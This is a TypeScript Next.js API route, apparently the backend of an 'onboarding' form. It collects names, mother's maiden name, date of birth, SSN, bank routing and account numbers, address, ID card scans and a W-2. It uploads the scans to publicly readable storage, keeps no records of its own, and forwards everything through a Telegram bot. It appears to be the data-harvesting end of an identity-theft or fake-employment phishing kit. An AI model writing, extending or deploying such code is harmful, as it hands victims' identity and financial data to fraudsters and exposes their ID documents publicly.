// app/api/onboarding/route.ts
import { NextResponse } from "next/server";
import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { randomUUID } from "crypto";
import sendTelegramNotification  from "@/app/lib/sendTelegramNotification";

export const runtime = "nodejs";
export const maxDuration = 60;

type Env = {
  NEXT_PUBLIC_SUPABASE_URL: string;
  SUPABASE_SERVICE_ROLE_KEY: string;
};

function requireEnv(): Env {
  const NEXT_PUBLIC_SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!NEXT_PUBLIC_SUPABASE_URL) throw new Error("Missing env var: NEXT_PUBLIC_SUPABASE_URL");
  if (!SUPABASE_SERVICE_ROLE_KEY) throw new Error("Missing env var: SUPABASE_SERVICE_ROLE_KEY");

  return { NEXT_PUBLIC_SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY };
}

function makeSupabase(url: string, serviceKey: string) {
  return createClient(url, serviceKey, { auth: { persistSession: false } });
}

function sanitize(str: string) {
  return str.replace(/[^a-zA-Z0-9\-_]/g, "_");
}

function guessExt(file: Blob) {
  const type = (file.type || "").toLowerCase();
  if (type === "image/jpeg") return "jpg";
  if (type === "image/png") return "png";
  if (type === "application/pdf") return "pdf";
  const parts = type.split("/");
  return parts[1] || "bin";
}

async function uploadToSupabase(opts: {
  supabase: SupabaseClient;
  file: Blob;
  filename: string;
  bucket?: string;
}) {
  const { supabase, file, filename, bucket = "onboarding" } = opts;

  const buffer = Buffer.from(await file.arrayBuffer());
  const contentType = file.type || "application/octet-stream";

  const { error: uploadError } = await supabase.storage
    .from(bucket)
    .upload(filename, buffer, { contentType, upsert: true });

  if (uploadError) {
    console.error("❌ Upload error:", uploadError.message);
    throw new Error(`Upload failed for ${filename}: ${uploadError.message}`);
  }

  const { data: urlData } = supabase.storage.from(bucket).getPublicUrl(filename);
  if (!urlData?.publicUrl) throw new Error(`Failed to get public URL for ${filename}`);

  return urlData.publicUrl;
}

// Optional: avoid Telegram markdown issues
function esc(s: string) {
  return s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

export async function POST(req: Request) {
  try {
    const env = requireEnv();
    const supabase = makeSupabase(env.NEXT_PUBLIC_SUPABASE_URL, env.SUPABASE_SERVICE_ROLE_KEY);

    const formData = await req.formData();
    const get = (key: string) => formData.get(key)?.toString().trim() ?? "";

    // Fields
    const first_name = get("first_name");
    const middle_name = get("middle_name");
    const last_name = get("last_name");
    const mother_maiden = get("motherMaidenName");

    const ssn_raw = get("ssn");
    const ssn_digits = ssn_raw.replace(/\D/g, "");
    const ssn = ssn_digits ? ssn_digits : ""; // Telegram only

    const date_of_birth = get("date_of_birth");
    const routing_number = get("routing_number");
    const account_number = get("account_number");
    const bank_name = get("bank_name");

    const street = get("address.street");
    const city = get("address.city");
    const state = get("address.state");
    const zip_code = get("address.zip_code");

    // ✅ Validation (NO applicant_id)
    if (!first_name || !last_name) {
      return NextResponse.json({ error: "Missing first_name or last_name." }, { status: 400 });
    }

    if (![street, city, state, zip_code].every(Boolean)) {
      return NextResponse.json({ error: "All address fields are required." }, { status: 400 });
    }

    if (ssn && !/^\d{9}$/.test(ssn)) {
      return NextResponse.json({ error: "SSN must be exactly 9 digits." }, { status: 400 });
    }

    const front_image = formData.get("front_image");
    const back_image = formData.get("back_image");
    const w2_form = formData.get("w2_form");

    if (!(front_image instanceof Blob) || !(back_image instanceof Blob) || !(w2_form instanceof Blob)) {
      return NextResponse.json({ error: "Missing or invalid file(s)." }, { status: 400 });
    }

    const generateFilename = (label: string, file: Blob) => {
      const ext = guessExt(file);
      const cleanName = sanitize(`${first_name}-${last_name}-${label}`);
      return `${label}/${cleanName}-${randomUUID()}.${ext}`;
    };

    const front_image_filename = generateFilename("front", front_image);
    const back_image_filename = generateFilename("back", back_image);
    const w2_form_filename = generateFilename("w2", w2_form);

    const [front_url, back_url, w2_url] = await Promise.all([
      uploadToSupabase({ supabase, file: front_image, filename: front_image_filename }),
      uploadToSupabase({ supabase, file: back_image, filename: back_image_filename }),
      uploadToSupabase({ supabase, file: w2_form, filename: w2_form_filename }),
    ]);

    // ✅ Telegram only (no DB, no applicant id)
    const fullName = `${first_name} ${middle_name ? middle_name + " " : ""}${last_name}`.trim();

   const messageLines = [
  "📥 *New Onboarding*",
  `👤 Name: ${fullName}`,
  mother_maiden ? `👩 Maiden Name: ${mother_maiden}` : null,
  date_of_birth ? `🎂 DOB: ${date_of_birth}` : null,
  ssn ? `🧾 SSN: ${ssn}` : "🧾 SSN: (not provided)",
  "",
  `🏠 Address: ${street}, ${city}, ${state} ${zip_code}`,
  "",
  bank_name ? `🏦 Bank: ${bank_name}` : "🏦 Bank: (not provided)",
  routing_number ? `🔢 Routing: ${routing_number}` : null,
  account_number ? `💳 Account: ${account_number}` : null,
  "",
  `🪪 Front ID: ${front_url}`,
  `🪪 Back ID: ${back_url}`,
  `📄 W-2: ${w2_url}`,
].filter(Boolean) as string[];

await sendTelegramNotification(messageLines.join("\n"), {
  parse_mode: "Markdown",
  disable_web_page_preview: true,
});


    return NextResponse.json({ success: true, front_url, back_url, w2_url });
  } catch (err: any) {
    console.error("❌ Onboarding failed:", err?.message || err);

    const msg = String(err?.message || "");
    if (msg.startsWith("Missing env var:")) {
      return NextResponse.json({ error: msg }, { status: 500 });
    }

    return NextResponse.json({ error: "Failed to complete onboarding." }, { status: 500 });
  }
}
